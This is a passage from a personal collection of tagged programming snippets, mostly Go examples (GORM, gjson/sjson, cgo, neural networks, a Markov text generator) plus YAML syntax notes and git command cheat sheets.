    defer reader.Close()
default:
    reader = response.Body
}

io.Copy(os.Stdout, reader) // print html to standard out
==================================================
Yaml syntax
(tags: yaml syntax)
---

https://alingvo.ru/help-ru/yml

--- # Movie list: block sequence
- Casablanca
- Spellbound
- Notorious
--- # Shopping list: one-line sequence
[milk, bread, eggs, juice]

--- # Block format
name: John Smith
age: 33
--- # Single line format
{name: John Smith, age: 33}

# Block literals (line feeds are preserved):
--- |
  There was a young fellow of Warwick
  Who had reason for feeling euphoric
      For he could, by election
      Have triune erection
  Ionic, Corinthian, and Doric

# Block literals (line feeds are ignored):
--- >
  Wrapped text
  will be folded
  into a single
  paragraph

  Blank lines denote
  paragraph breaks

# Sequences from maps:
- {name: John Smith, age: 33}
- name: Mary Smith
  age: 27

# Maps from sequences:
men: [John Smith, Bill Jones]
women:
  - Mary Smith
  - Susan Williams

https://webdevblog.ru/yaml-dlya-veb-razrabotchikov/

# json
{
  "company": "Google",
  "full_name": "John Foo Bar Doe",
  "name": "John",
  "surname": "Christian Meyer"
}
# yaml
company: Google             # Single words, no quotes
full_name: John Foo Bar Doe # Full sentence, no quotes
name: 'John'                # Using single quotes
surname: "Christian Meyer"  # Using double quotes

year: 2019 # Integer
nodeVersion: 10.8 # Float

#json
{
  "production": {
    "node_version": "13.0.0",
    "os": "ubuntu",
    "package_manager": "yarn",
    "run": ["yarn install", "NODE_ENV=${ENVIRONMENT} yarn build"],
    "env": {
      "ENVIRONMENT": "production"
    }
  },
  "staging": {
    "node_version": "13.0.0",
    "os": "ubuntu",
    "package_manager": "yarn",
    "run": ["yarn install", "NODE_ENV=${ENVIRONMENT} yarn build"],
    "env": {
      "ENVIRONMENT": "staging"
    }
  }
}
#yaml
base-config: &base
  node_version: 13.0.0
  os: ubuntu
  package_manager: yarn
  run:
    - yarn install
    - NODE_ENV=${ENVIRONMENT} yarn build

production:
  # Injection «base» attributes in production
  <<: *base
  env:
    - ENVIRONMENT: production

staging:
  # Injection «base» attributes in staging
  <<: *base
  env:
    - ENVIRONMENT: staging
==================================================
Convert between Windows-1251 and UTF-8
(tags: convert windows1251 utf8)
---

https://golangs.org/open-write-utf-8-file-charset

package main

import (
  "fmt"
  "io/ioutil"
  "os"
  "golang.org/x/text/encoding/charmap"
)

func main() {
  // Write string in Windows-1252
  encoder := charmap.Windows1252.NewEncoder()
  s, e := encoder.String("This is sample text with runes Š")
  if e != nil {
    panic(e)
  }
  ioutil.WriteFile("example.txt", []byte(s), os.ModePerm)

  // Decode in UTF-8
  f, e := os.Open("example.txt")
  if e != nil {
    panic(e)
  }
  defer f.Close()
  decoder := charmap.Windows1252.NewDecoder()
  reader := decoder.Reader(f)
  b, err := ioutil.ReadAll(reader)
  if err != nil {
    panic(err)
  }
  fmt.Println(string(b))
}
==================================================
Resetting remote to a certain commit
(tags: git reset remote commit)
---

https://stackoverflow.com/questions/5816688/resetting-remote-to-a-certain-commit

git reset --hard <commit-hash>
git push -f origin master
==================================================
Gorm many2many
(tags: gorm many2many)
---

import (
  "gorm.io/gorm"
)

type Topic struct {
  gorm.Model
  Id      int    `gorm:"primaryKey"`
  Title   string `gorm:"unique"`
  Code    string
  Checked bool
  Tags    []Tag `gorm:"many2many:topic_tags;"`
}

//type TopicTags struct {
//  gorm.Model
//  Id int `gorm:"primaryKey"`
//  Topics []Topic `gorm:"many2many:topic_tags;"`
//  Tags    []Tag `gorm:"many2many:topic_tags;"`
//}

type Tag struct {
  gorm.Model
  Id     int     `gorm:"primaryKey"`
  Name   string  `gorm:"unique"`
  Topics []Topic `gorm:"many2many:topic_tags;"`
}

// Create new topic
func create(db *gorm.DB, query string) Topic {
  topic := &Topic{
    Title: "Some title",
    Code: "Some code",
    Tags: []Tag{
      {
        Name: "testtag",
      },
    },
  }
  tags := topic.Tags
  for i, tag := range tags {
    db.Where("name = ?", tag.Name).Find(&tag)
    if tag.Id == 0 {
      db.Create(&tag)
    }
    tags[i] = tag
  }
  topic.Tags = tags
  db.Create(topic)
  return *topic
}

// Get all tags
func getAllTags(db *gorm.DB) []Tag {
  var tags []Tag
  n.db.Find(&tags)
  return tags
}

// Get all topics
func getAllTopics(db *gorm.DB) []Topic {
  var topics []Topic
  n.db.Find(&topics)
  return topics
}

// Get topics that have some tags
func getTopicsWithTags(db *gorm.DB, queryTags []string) []Topic {
  // get matched tags
  var tags []Tag
  n.db.Where("name IN ?", queryTags).Find(&tags)

  // get associated topics by tags
  var topics []Topic
  n.db.Model(&tags).Association("Topics").Find(&topics)

  // return topics

  // make set deduplicate topics
  set := make(map[string]Topic)
  for _, topic := range topics {
    set[topic.Title] = topic
  }

  // struct for sorting
  var matchTopic struct {
    match int
    topic Topic
  }

  // make slice for counting matches
  matches := make([]matchTopic, 0, len(set))
  for _, topic := range set {
    // add tags to topic struct
    n.db.Model(&topic).Association("Tags").Find(&topic.Tags)
    match := 0
    for _, tag := range topic.Tags {
      for _, queryTag := range queryTags {
        if tag.Name == queryTag {
          match++
        }
      }
    }
    matches = append(matches, matchTopic{match: match, topic: topic})
  }

  // sort slice by matches desc
  sort.Slice(matches, func(i, j int) bool {
    return matches[i].match > matches[j].match
  })

  res := make([]Topic, 0, len(matches))
  for _, val := range matches {
    res = append(res, val.topic)
  }
  return res
}
==================================================
Get json without serialisation
(tags: get json gjson)
---

https://github.com/tidwall/gjson

package main

import "github.com/tidwall/gjson"

const json = `{"name":{"first":"Janet","last":"Prichard"},"age":47}`

func main() {
  value := gjson.Get(json, "name.last")
  println(value.String())
}

{
  "name": {"first": "Tom", "last": "Anderson"},
  "age":37,
  "children": ["Sara","Alex","Jack"],
  "fav.movie": "Deer Hunter",
  "friends": [
    {"first": "Dale", "last": "Murphy", "age": 44, "nets": ["ig", "fb", "tw"]},
    {"first": "Roger", "last": "Craig", "age": 68, "nets": ["fb", "tw"]},
    {"first": "Jane", "last": "Murphy", "age": 47, "nets": ["ig", "tw"]}
  ]
}

// path in gjson.Get
"name.last"          >> "Anderson"
"age"                >> 37
"children"           >> ["Sara","Alex","Jack"]
"children.#"         >> 3
"children.1"         >> "Alex"
"child*.2"           >> "Jack"
"c?ildren.0"         >> "Sara"
"fav\.movie"         >> "Deer Hunter"
"friends.#.first"    >> ["Dale","Roger","Jane"]
"friends.1.last"     >> "Craig"

friends.#(last=="Murphy").first    >> "Dale"
friends.#(last=="Murphy")#.first   >> ["Dale","Jane"]
friends.#(age>45)#.last            >> ["Craig","Murphy"]
friends.#(first%"D*").last         >> "Murphy"
friends.#(first!%"D*").last        >> "Craig"
friends.#(nets.#(=="fb"))#.first   >> ["Dale","Roger"]

// types
bool, for JSON booleans
float64, for JSON numbers
string, for JSON string literals
nil, for JSON null

result.Type    // can be String, Number, True, False, Null, or JSON
result.Str     // holds the string
result.Num     // holds the float64 number
result.Raw     // holds the raw json
result.Index   // index of raw value in original json, zero means index unknown

"children|@reverse"           >> ["Jack","Alex","Sara"]
"children|@reverse|0"         >> "Jack"

// modifiers
@reverse: Reverse an array or the members of an object.
@ugly: Remove all whitespace from a json document.
@pretty: Make the json document more human readable.
@this: Returns the current element. It can be used to retrieve the root element.
@valid: Ensure the json document is valid.
@flatten: Flattens an array.
@join: Joins multiple objects into a single object.

// Custom modifiers
gjson.AddModifier("case", func(json, arg string) string {
  if arg == "upper" {
    return strings.ToUpper(json)
  }
  if arg == "lower" {
    return strings.ToLower(json)
  }
  return json
})
"children|@case:upper"           >> ["SARA","ALEX","JACK"]
"children|@case:lower|@reverse"  >> ["jack","alex","sara"]

// JSON Lines
{"name": "Gilbert", "age": 61}
{"name": "Alexa", "age": 34}
{"name": "May", "age": 57}
{"name": "Deloise", "age": 44}
..#                   >> 4
..1                   >> {"name": "Alexa", "age": 34}
..3                   >> {"name": "Deloise", "age": 44}
..#.name              >> ["Gilbert","Alexa","May","Deloise"]
..#(name="May").age   >> 57

// Unmarshal to a map
m, ok := gjson.Parse(json).Value().(map[string]interface{})
if !ok {
  // not a map
}

// Validate JSON
if !gjson.Valid(json) {
  return errors.New("invalid json")
}
value := gjson.Get(json, "name.last")

// For each
result := gjson.Get(json, "programmers")
result.ForEach(func(key, value gjson.Result) bool {
  println(value.String())
  return true // keep iterating
})
==================================================
Set json without serialisation
(tags: set json sjson)
---

https://github.com/tidwall/sjson

package main

import "github.com/tidwall/sjson"

const json = `{"name":{"first":"Janet","last":"Prichard"},"age":47}`

func main() {
  value, _ := sjson.Set(json, "name.last", "Anderson")
  println(value)
}

// Set a value from empty document:
value, _ := sjson.Set("", "name", "Tom")
println(value)
// Output:
// {"name":"Tom"}

// Set a nested value from empty document:
value, _ := sjson.Set("", "name.last", "Anderson")
println(value)
// Output:
// {"name":{"last":"Anderson"}}

// Set a new value:
value, _ := sjson.Set(`{"name":{"last":"Anderson"}}`, "name.first", "Sara")
println(value)
// Output:
// {"name":{"first":"Sara","last":"Anderson"}}

// Update an existing value:
value, _ := sjson.Set(`{"name":{"last":"Anderson"}}`, "name.last", "Smith")
println(value)
// Output:
// {"name":{"last":"Smith"}}

// Set a new array value:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.2", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol","Sara"]

// Append an array value by using the -1 key in a path:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.-1", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol","Sara"]

// Append an array value that is past the end:
value, _ := sjson.Set(`{"friends":["Andy","Carol"]}`, "friends.4", "Sara")
println(value)
// Output:
// {"friends":["Andy","Carol",null,null,"Sara"]

// Delete a value:
value, _ := sjson.Delete(`{"name":{"first":"Sara","last":"Anderson"}}`, "name.first")
println(value)
// Output:
// {"name":{"last":"Anderson"}}

// Delete an array value:
value, _ := sjson.Delete(`{"friends":["Andy","Carol"]}`, "friends.1")
println(value)
// Output:
// {"friends":["Andy"]}

// Delete the last array value:
value, _ := sjson.Delete(`{"friends":["Andy","Carol"]}`, "friends.-1")
println(value)
// Output:
// {"friends":["Andy"]}
==================================================
Git rename local and remote branch
(tags: git rename branch)
---

https://stackoverflow.com/questions/30590083/how-do-i-rename-both-a-git-local-and-remote-branch-name

// Renaming local and remote
# Rename the local branch to the new name
git branch -m <old_name> <new_name>
# Delete the old branch on remote - where <remote> is, for example, origin
git push <remote> --delete <old_name>
# Or shorter way to delete remote branch [:]
git push <remote> :<old_name>
# Prevent git from using the old name when pushing in the next step.
# Otherwise, git will use the old upstream name instead of <new_name>.
git branch --unset-upstream <old_name>
# Push the new branch to remote
git push <remote> <new_name>
# Reset the upstream branch for the new_name local branch
git push <remote> -u <new_name>

// Renaming Only remote branch
# In this option, we will push the branch to the remote with the new name
# While keeping the local name as is
git push <remote> <remote>/<old_name>:refs/heads/<new_name> :<old_name>
==================================================
Switch between users on terminal
(tags: switch user terminal)
---

$ whoami
user1
$ su - user2
Password:
$ whoami
user2
$ sudo -s
Password:
$ whoami
root
==================================================
Cgo
(tags: cgo)
---

https://github.com/golang/go/wiki/cgo

package main

/*
#include <stdio.h>
#include <stdlib.h>

void myprint(char* s) {
  printf("%s\n", s);
}
*/
import "C"

import "unsafe"

func Example() {
  cs := C.CString("Hello from stdio\n")
  C.myprint(cs)
  C.free(unsafe.Pointer(cs))
}

func main() {
  Example()
}
==================================================
Generate text with Markov chain algorythm
(tags: markov text)
---

https://kodazm.ru/articles/markov-twitter-botnet/

package main

import (
  "fmt"
  "io/ioutil"
  "math/rand"
  "regexp"
  "strconv"
  "strings"
  "tbot/internal/errors"
)

func main() {
  states := initialize("book.txt")
  word := "human"
  count := 10
  result := generateText(states, word, count)
  fmt.Println(result)
}

type State struct {
  Id         int
  Word       string
  Count      int
  Prob       float64
  NextStates []State
}

func initialize(file string) []State {
  text := readTxt(file)
  return train(text)
}

func readTxt(path string) string {
  data, err := ioutil.ReadFile(path)
  errors.PanicIfErr(err)
  dataClean := strings.Replace(string(data), "\n", " ", -1)
  dataClean = strings.Replace(dataClean, ".", "", -1)
  dataClean = strings.Replace(dataClean, ",", "", -1)
  dataClean = strings.Replace(dataClean, "-", "", -1)
  dataClean = strings.Replace(dataClean, "!", "", -1)
  dataClean = strings.Replace(dataClean, "?", "", -1)
  dataClean = strings.Replace(dataClean, "[", "", -1)
  dataClean = strings.Replace(dataClean, "]", "", -1)
  dataClean = strings.ToLower(dataClean)
  dataClean = strings.Replace(dataClean, "бог", "Бог", -1)
  return dataClean
}

func printLoading(n int, total int) {
  var bar []string
  tantPerFourty := int((float64(n) / float64(total)) * 40)
  tantPerCent := int((float64(n) / float64(total)) * 100)
  for i := 0; i < tantPerFourty; i++ {
    bar = append(bar, "█")
  }
  progressBar := strings.Join(bar, "")
  fmt.Printf("\r " + progressBar + " - " + strconv.Itoa(tantPerCent) + "")
}

func addWordToStates(states []State, word string) ([]State, int) {
  iState := -1
  for i := 0; i < len(states); i++ {
    if states[i].Word == word {
      iState = i
    }
  }
  if iState >= 0 {
    states[iState].Count++
  } else {
    var tempState State
    tempState.Word = word
    tempState.Count = 1

    states = append(states, tempState)
    iState = len(states) - 1

  }
  return states, iState
}

func calcMarkovStates(words []string) []State {
  var states []State
  //count words
  for i := 0; i < len(words)-1; i++ {
    var iState int
    states, iState = addWordToStates(states, words[i])
    if iState < len(words) {
      states[iState].NextStates, _ = addWordToStates(states[iState].NextStates, words[i+1])
    }

    printLoading(i, len(words))
  }

  //count prob
  for i := 0; i < len(states); i++ {
    states[i].Prob = (float64(states[i].Count) / float64(len(words)) * 100)
    for j := 0; j < len(states[i].NextStates); j++ {
      states[i].NextStates[j].Prob = (float64(states[i].NextStates[j].Count) / float64(len(words)) * 100)
    }
  }
  fmt.Println("\ntotal words computed: " + strconv.Itoa(len(words)))
  return states
}

func textToWords(text string) []string {
  s := strings.Split(text, " ")
  return s
  words := make([]string, 0, len(s))
  patternDigits := *regexp.MustCompile(`[\d]`)
  patternEngWord := *regexp.MustCompile(`[a-zA-Z]`)
  for _, word := range s {
    if word == "" || patternDigits.Match([]byte(word)) || patternEngWord.Match([]byte(word)) {
      continue
    }
    words = append(words, word)
  }
  return words
}

func train(text string) []State {
  words := textToWords(text)
  states := calcMarkovStates(words)
  return states
}

//-----------------

func getNextMarkovState(states []State, word string) string {
  iState := -1
  for i := 0; i < len(states); i++ {
    if states[i].Word == word {
      iState = i
    }
  }
  if iState < 0 {
    return "word no exist on the memory"
  }
  var next State
  next = states[iState].NextStates[0]
  next.Prob = rand.Float64() * states[iState].Prob
  for i := 0; i < len(states[iState].NextStates); i++ {
    if (rand.Float64()*states[iState].NextStates[i].Prob) > next.Prob && states[iState-1].Word != states[iState].NextStates[i].Word {
      next = states[iState].NextStates[i]
    }
  }
  return next.Word
}

func generateText(states []State, initWord string, count int) string {
  var generatedText []string
  word := initWord
  generatedText = append(generatedText, word)
  for i := 0; i < count; i++ {
    word = getNextMarkovState(states, word)
    if word == "word no exist on the memory" {
      return "word no exist on the memory"
    }
    generatedText = append(generatedText, word)
  }
  //generatedText = append(generatedText, ".")
  text := strings.Join(generatedText, " ")
  return text
}
==================================================
Neural network with gonum
(tags: neural gonum)
---

https://github.com/dwhitena/gophernet

package main

import (
  "encoding/csv"
  "errors"
  "fmt"
  "log"
  "math"
  "math/rand"
  "os"
  "strconv"
  "time"

  "gonum.org/v1/gonum/floats"
  "gonum.org/v1/gonum/mat"
)

// neuralNet contains all of the information
// that defines a trained neural network.
type neuralNet struct {
  config  neuralNetConfig
  wHidden *mat.Dense
  bHidden *mat.Dense
  wOut    *mat.Dense
  bOut    *mat.Dense
}

// neuralNetConfig defines our neural network
// architecture and learning parameters.
type neuralNetConfig struct {
  inputNeurons  int
  outputNeurons int
  hiddenNeurons int
  numEpochs     int
  learningRate  float64
}

func main() {

  // Form the training matrices.
  inputs, labels := makeInputsAndLabels("data/train.csv")

  // Define our network architecture and learning parameters.
  config := neuralNetConfig{
    inputNeurons:  4,
    outputNeurons: 3,
    hiddenNeurons: 3,
    numEpochs:     5000,
    learningRate:  0.3,
  }

  // Train the neural network.
  network := newNetwork(config)
  if err := network.train(inputs, labels); err != nil {
    log.Fatal(err)
  }

  // Form the testing matrices.
  testInputs, testLabels := makeInputsAndLabels("data/test.csv")

  // Make the predictions using the trained model.
  predictions, err := network.predict(testInputs)
  if err != nil {
    log.Fatal(err)
  }

  // Calculate the accuracy of our model.
  var truePosNeg int
  numPreds, _ := predictions.Dims()
  for i := 0; i < numPreds; i++ {

    // Get the label.
    labelRow := mat.Row(nil, i, testLabels)
    var prediction int
    for idx, label := range labelRow {
      if label == 1.0 {
        prediction = idx
        break
      }
    }

    // Accumulate the true positive/negative count.
    if predictions.At(i, prediction) == floats.Max(mat.Row(nil, i, predictions)) {
      truePosNeg++
    }
  }

  // Calculate the accuracy (subset accuracy).
  accuracy := float64(truePosNeg) / float64(numPreds)

  // Output the Accuracy value to standard out.
  fmt.Printf("\nAccuracy = %0.2f\n\n", accuracy)
}

// NewNetwork initializes a new neural network.
func newNetwork(config neuralNetConfig) *neuralNet {
  return &neuralNet{config: config}
}

// train trains a neural network using backpropagation.
func (nn *neuralNet) train(x, y *mat.Dense) error {

  // Initialize biases/weights.
  randSource := rand.NewSource(time.Now().UnixNano())
  randGen := rand.New(randSource)

  wHidden := mat.NewDense(nn.config.inputNeurons, nn.config.hiddenNeurons, nil)
  bHidden := mat.NewDense(1, nn.config.hiddenNeurons, nil)
  wOut := mat.NewDense(nn.config.hiddenNeurons, nn.config.outputNeurons, nil)
  bOut := mat.NewDense(1, nn.config.outputNeurons, nil)

  wHiddenRaw := wHidden.RawMatrix().Data
  bHiddenRaw := bHidden.RawMatrix().Data
  wOutRaw := wOut.RawMatrix().Data
  bOutRaw := bOut.RawMatrix().Data

  for _, param := range [][]float64{
    wHiddenRaw,
    bHiddenRaw,
    wOutRaw,
    bOutRaw,
  } {
    for i := range param {
      param[i] = randGen.Float64()
    }
  }

  // Define the output of the neural network.
  output := new(mat.Dense)

  // Use backpropagation to adjust the weights and biases.
  if err := nn.backpropagate(x, y, wHidden, bHidden, wOut, bOut, output); err != nil {
    return err
  }

  // Define our trained neural network.
  nn.wHidden = wHidden
  nn.bHidden = bHidden
  nn.wOut = wOut
  nn.bOut = bOut

  return nil
}

// backpropagate completes the backpropagation method.
func (nn *neuralNet) backpropagate(x, y, wHidden, bHidden, wOut, bOut, output *mat.Dense) error {

  // Loop over the number of epochs utilizing
  // backpropagation to train our model.
  for i := 0; i < nn.config.numEpochs; i++ {

    // Complete the feed forward process.
    hiddenLayerInput := new(mat.Dense)
    hiddenLayerInput.Mul(x, wHidden)
    addBHidden := func(_, col int, v float64) float64 { return v + bHidden.At(0, col) }
    hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)

    hiddenLayerActivations := new(mat.Dense)
    applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }
    hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)

    outputLayerInput := new(mat.Dense)
    outputLayerInput.Mul(hiddenLayerActivations, wOut)
    addBOut := func(_, col int, v float64) float64 { return v + bOut.At(0, col) }
    outputLayerInput.Apply(addBOut, outputLayerInput)
    output.Apply(applySigmoid, outputLayerInput)

    // Complete the backpropagation.
    networkError := new(mat.Dense)
    networkError.Sub(y, output)

    slopeOutputLayer := new(mat.Dense)
    applySigmoidPrime := func(_, _ int, v float64) float64 { return sigmoidPrime(v) }
    slopeOutputLayer.Apply(applySigmoidPrime, output)
    slopeHiddenLayer := new(mat.Dense)
    slopeHiddenLayer.Apply(applySigmoidPrime, hiddenLayerActivations)

    dOutput := new(mat.Dense)
    dOutput.MulElem(networkError, slopeOutputLayer)
    errorAtHiddenLayer := new(mat.Dense)
    errorAtHiddenLayer.Mul(dOutput, wOut.T())

    dHiddenLayer := new(mat.Dense)
    dHiddenLayer.MulElem(errorAtHiddenLayer, slopeHiddenLayer)

    // Adjust the parameters.
    wOutAdj := new(mat.Dense)
    wOutAdj.Mul(hiddenLayerActivations.T(), dOutput)
    wOutAdj.Scale(nn.config.learningRate, wOutAdj)
    wOut.Add(wOut, wOutAdj)

    bOutAdj, err := sumAlongAxis(0, dOutput)
    if err != nil {
      return err
    }
    bOutAdj.Scale(nn.config.learningRate, bOutAdj)
    bOut.Add(bOut, bOutAdj)

    wHiddenAdj := new(mat.Dense)
    wHiddenAdj.Mul(x.T(), dHiddenLayer)
    wHiddenAdj.Scale(nn.config.learningRate, wHiddenAdj)
    wHidden.Add(wHidden, wHiddenAdj)

    bHiddenAdj, err := sumAlongAxis(0, dHiddenLayer)
    if err != nil {
      return err
    }
    bHiddenAdj.Scale(nn.config.learningRate, bHiddenAdj)
    bHidden.Add(bHidden, bHiddenAdj)
  }

  return nil
}

// predict makes a prediction based on a trained
// neural network.
func (nn *neuralNet) predict(x *mat.Dense) (*mat.Dense, error) {

  // Check to make sure that our neuralNet value
  // represents a trained model.
  if nn.wHidden == nil || nn.wOut == nil {
    return nil, errors.New("the supplied weights are empty")
  }
  if nn.bHidden == nil || nn.bOut == nil {
    return nil, errors.New("the supplied biases are empty")
  }

  // Define the output of the neural network.
  output := new(mat.Dense)

  // Complete the feed forward process.
  hiddenLayerInput := new(mat.Dense)
  hiddenLayerInput.Mul(x, nn.wHidden)
  addBHidden := func(_, col int, v float64) float64 { return v + nn.bHidden.At(0, col) }
  hiddenLayerInput.Apply(addBHidden, hiddenLayerInput)

  hiddenLayerActivations := new(mat.Dense)
  applySigmoid := func(_, _ int, v float64) float64 { return sigmoid(v) }
  hiddenLayerActivations.Apply(applySigmoid, hiddenLayerInput)

  outputLayerInput := new(mat.Dense)
  outputLayerInput.Mul(hiddenLayerActivations, nn.wOut)
  addBOut := func(_, col int, v float64) float64 { return v + nn.bOut.At(0, col) }
  outputLayerInput.Apply(addBOut, outputLayerInput)
  output.Apply(applySigmoid, outputLayerInput)

  return output, nil
}

// sigmoid implements the sigmoid function
// for use in activation functions.
func sigmoid(x float64) float64 {
  return 1.0 / (1.0 + math.Exp(-x))
}

// sigmoidPrime implements the derivative
// of the sigmoid function for backpropagation.
func sigmoidPrime(x float64) float64 {
  return sigmoid(x) * (1.0 - sigmoid(x))
}

// sumAlongAxis sums a matrix along a
// particular dimension, preserving the
// other dimension.
func sumAlongAxis(axis int, m *mat.Dense) (*mat.Dense, error) {

  numRows, numCols := m.Dims()

  var output *mat.Dense

  switch axis {
  case 0:
    data := make([]float64, numCols)
    for i := 0; i < numCols; i++ {
      col := mat.Col(nil, i, m)
      data[i] = floats.Sum(col)
    }
    output = mat.NewDense(1, numCols, data)
  case 1:
    data := make([]float64, numRows)
    for i := 0; i < numRows; i++ {
      row := mat.Row(nil, i, m)
      data[i] = floats.Sum(row)
    }
    output = mat.NewDense(numRows, 1, data)
  default:
    return nil, errors.New("invalid axis, must be 0 or 1")
  }

  return output, nil
}

func makeInputsAndLabels(fileName string) (*mat.Dense, *mat.Dense) {
  // Open the dataset file.
  f, err := os.Open(fileName)
  if err != nil {
    log.Fatal(err)
  }
  defer f.Close()

  // Create a new CSV reader reading from the opened file.
  reader := csv.NewReader(f)
  reader.FieldsPerRecord = 7

  // Read in all of the CSV records
  rawCSVData, err := reader.ReadAll()
  if err != nil {
    log.Fatal(err)
  }

  // inputsData and labelsData will hold all the
  // float values that will eventually be
  // used to form matrices.
  inputsData := make([]float64, 4*len(rawCSVData))
  labelsData := make([]float64, 3*len(rawCSVData))

  // Will track the current index of matrix values.
  var inputsIndex int
  var labelsIndex int

  // Sequentially move the rows into a slice of floats.
  for idx, record := range rawCSVData {

    // Skip the header row.
    if idx == 0 {
      continue
    }

    // Loop over the float columns.
    for i, val := range record {

      // Convert the value to a float.
      parsedVal, err := strconv.ParseFloat(val, 64)
      if err != nil {
        log.Fatal(err)
      }

      // Add to the labelsData if relevant.
      if i == 4 || i == 5 || i == 6 {
        labelsData[labelsIndex] = parsedVal
        labelsIndex++
        continue
      }

      // Add the float value to the slice of floats.
      inputsData[inputsIndex] = parsedVal
      inputsIndex++
    }
  }
  inputs := mat.NewDense(len(rawCSVData), 4, inputsData)
  labels := mat.NewDense(len(rawCSVData), 3, labelsData)
  return inputs, labels
}
==================================================
Neural network with GoNN
(tags: neural gonn)
---

https://habr.com/ru/post/343466/

package main

import (
  "fmt"
  "github.com/fxsjy/gonn/gonn"
)

func main() {
  // create neural net and save it in file gonn
  CreateNN()

  // load NN from file
  nn := gonn.LoadNN("gonn")

  hp := 0.7 // (0.1 - 1.0)
  weapon := 1.0 //(0 - no, 1 - yes)
  enemyCount := 1.0

  // Get answer from NN
  out := nn.Forward([]float64{hp, weapon, enemyCount})
  fmt.Println(GetResult(out))
}

func CreateNN() {
  // Create NN with 3 input neurons, 16 hidden, 4 outputs
  nn := gonn.DefaultNetwork(3, 16, 4, false)

  // Create slice with input params:
  // 0 param - hp (0.1 - 1.0)
  // 1 param - have weapon (0 - no, 1 - yes)
  // 2 param - enemy count
  input := [][]float64 {
    {0.5, 1, 1}, {0.9, 1, 2}, {0.8, 0, 1},
    {0.3, 1, 1}, {0.6, 1, 2}, {0.4, 0, 1},
    {0.9, 1, 7}, {0.6, 1, 4}, {0.1, 0, 1},
    {0.6, 1, 0}, {1, 0, 0} }

  // What we want to get in result
  // 0 param "Attack"
  // 1 param "Creep"
  // 2 param "Run"
  // 3 param "Nothing"
  target := [][]float64 {
    {1, 0, 0, 0}, {1, 0, 0, 0}, {1, 0, 0, 0},
    {0, 1, 0, 0}, {0, 1, 0, 0}, {0, 1, 0, 0},
    {0, 0, 1, 0}, {0, 0, 1, 0}, {0, 0, 1, 0},
    {0, 0, 0, 1}, {0, 0, 0, 1} }

  // Train NN with 100000 iterations
  nn.Train(input, target, 100000)

  // Save NN in file
  gonn.DumpNN("gonn", nn)
}

func GetResult(output []float64) string {
  max := -99999.0
  pos := -1
  // Get one output neuron with biggest weight
  for i, value := range output {
    if value > max {
      max = value
      pos = i
    }
  }

  switch pos {
  case 0: return "Attack"
  case 1: return "Creep"
  case 2: return "Run"
  case 3: return "Nothing"
  }
  return ""
}
==================================================
Neural network with golearn
(tags: neural golearn)
---

https://github.com/sjwhitworth/golearn
https://github.com/sjwhitworth/golearn/blob/master/examples/datasets/iris.csv

// go get "github.com/gonum/matrix"

package main

import (
  "fmt"

  "github.com/sjwhitworth/golearn/base"
  "github.com/sjwhitworth/golearn/evaluation"
  "github.com/sjwhitworth/golearn/knn"
)

func main() {
  // Load in a dataset, with headers. Header attributes will be stored.
  // Think of instances as a Data Frame structure in R or Pandas.
  // You can also create instances from scratch.
  rawData, err := base.ParseCSVToInstances("datasets/iris.csv", false)
  if err != nil {
    panic(err)
  }

  // Print a pleasant summary of your data.
  fmt.Println(rawData)

  //Initialises a new KNN classifier
  cls := knn.NewKnnClassifier("euclidean", "linear", 2)

  //Do a training-test split
  trainData, testData := base.InstancesTrainTestSplit(rawData, 0.50)
  cls.Fit(trainData)

  //Calculates the Euclidean distance and returns the most popular label
  predictions, err := cls.Predict(testData)
  if err != nil {
    panic(err)
  }

  // Prints precision/recall metrics
  confusionMat, err := evaluation.GetConfusionMatrix(testData, predictions)
  if err != nil {
    panic(fmt.Sprintf("Unable to get confusion matrix: %s", err.Error()))
  }
  fmt.Println(evaluation.GetSummary(confusionMat))
}
==================================================
Git syntax
(tags: git syntax)
---

https://cheatography.com/mikesac/cheat-sheets/base-git/

//// Global Config­uration
// Globally configure your committer name
git config --global user.name "John Doe"
// Globally configure your committer email
git config --global user.email johndoe@example.com

//// Initialize new repository
// Initialize current directory as a new git repostiroy
git init
// Add remote repository with name 'origin'
git remote add origin https://repourl/repo.git
// Promote all folder content for commit
git add --all
// Commit all files with given comment
git commit -am"initial commit"

//// Clone existing remote repostiroy
// Clone remote repository via HTTPS, access credential could be reqeuired
git clone https://giturl/repo.git
// Clone remote repository via SSH, privat­e/p­ublic key exchange is required
git clone ssh://giturl/repo.git

//// Inspect your work
// Provide you with the difference in commits and push between your local repo and the remote origin
git status
// List latest commit on the local repository
git log
// Provide a diff view between the local file and the HEAD version on the remote origin
git diff ${FILENAME}

//// Save you work
// Retrieve all commit from remote repository named "­ori­gin­" and branch "­dev­elo­p" and merge them into local repository
git pull origin develop
// Promote ALL unstaged files for commit - use with care!
git add --all
// Promote given file/f­older for commit
git add ${FILENAME}
// Commit all promoted file to local repository
git commit -m"my details on commit"
// Push all commit to remote repository named "­ori­gin­" and branch "­dev­elo­p". Branch will be created if not present. May fail if remote repository has not been pulled before pushing since local repository is not up-to-date
git push origin develop

//// Branching
// List all avaiable branches
git branch -a
// Fetch all remote repository data into local one, including new branches
git fetch
// Fetch all remote repository data into local one, including new branches. -p (prune) causes unexisting remote branches to be dropped also locally
git fetch -p
// Create a new branch named "­new­bra­nch­" starting from current commit
git checkout -b newbranch
// Merge local branch named "­oth­erb­ran­ch" to be merged into current local branch
git merge otherbranch
// Push all commit in local branch newbranch to remote origin, creating remote branch if not already present
git push origin newbranch
// Delete local branch named "­old­bra­nch­". Any tag pushed from deleted branch will be preserved.
git branch -D oldbranch
// Delete remote branch named "­old­bra­nch­". Any tag pushed from deleted branch will be preserved.
git push origin --delete oldbranch
// Merge branch named "­fea­tur­ebr­anc­h" into current one, squasshing all commit into a single one. Commit with comment is needed to complete operation.
git merge --squash featurebranch

//// Tagging
// List all avaiable tags
git tag -l
// Fetch all remote repository data into local one, including tags
git fetch --tags
// Fetch all remote repository data into local one, including new tags. -p (prune) causes unexisting remote tags to be dropped also locally
git fetch --tags -p
// Creates a new tag named "­myt­ag" and attach it to current local commit
git tag mytag
// Push local tags to remote origin
git push origin --tags
// Delete local tag named "­old­tag­".
git tag -d oldtag
// Delete remote tag named "­old­tag­".
git push origin :refs/tags/oldtag

//// Cleaning up your repository
